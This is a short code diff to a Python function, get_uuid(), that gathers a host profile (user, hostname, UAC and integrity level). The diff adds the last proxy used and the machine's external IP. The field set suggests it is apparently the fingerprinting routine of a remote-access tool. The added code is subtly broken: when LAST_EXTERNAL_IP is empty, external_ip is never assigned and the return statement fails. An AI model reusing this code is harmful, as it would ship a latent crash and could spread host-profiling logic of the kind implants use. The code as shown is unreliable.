@@ -356,6 +356,23 @@ def get_uuid():
     except:
         cid = None
 
+    proxy = None
+    try:
+        from network.lib.proxies import LAST_PROXY
+        if LAST_PROXY:
+            proxy = tuple([
+                x for x in LAST_PROXY if x
+            ])
+    except ImportError:
+        proxy = None
+
+    try:
+        from network.lib.online import LAST_EXTERNAL_IP
+        if LAST_EXTERNAL_IP:
+            external_ip = str(LAST_EXTERNAL_IP)
+    except ImportError:
+        external_ip = None
+
     return {
         'user': user,
         'hostname': hostname,
@@ -373,4 +390,6 @@ def get_uuid():
         'uac_lvl': uacLevel,
         'intgty_lvl': integrity_level,
         'cid': cid,
+        'proxy': proxy,
+        'external_ip': external_ip
     }
